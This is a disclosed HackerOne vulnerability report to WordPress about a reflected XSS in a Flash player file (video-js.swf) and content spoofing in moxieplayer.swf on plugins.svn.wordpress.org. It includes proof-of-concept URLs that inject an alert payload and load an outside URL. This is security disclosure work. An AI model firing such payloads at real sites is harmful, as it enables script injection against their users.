# Reflected Swf XSS In ( plugins.svn.wordpress.org )

## Report Details
- **Report ID**: 270060
- **URL**: https://hackerone.com/reports/270060
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-09-21T01:42:18.159Z
- **Disclosed**: 2018-09-27T17:16:27.278Z

## Reporter
- **Username**: m7mdharoun
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: wordpress

## Vulnerability Information
Hello ,
 I have found XSS in flash File ( video-js.swf ) in  plugins.svn.wordpress.org 
 and Content Spoofing Vulnerability in moxieplayer.swf

          ** POC **
https://plugins.svn.wordpress.org/1player/tags/1.3/players/video-js/video-js.swf?readyFunction=alert(%27Hello%27)


{F222664}


https://plugins.svn.wordpress.org/agile-video-player/trunk/js/plugins/media/moxieplayer.swf?url=hekimuso1973.xsl.pt/723.flv

## Attachments
- XSS_wordpress.jpg
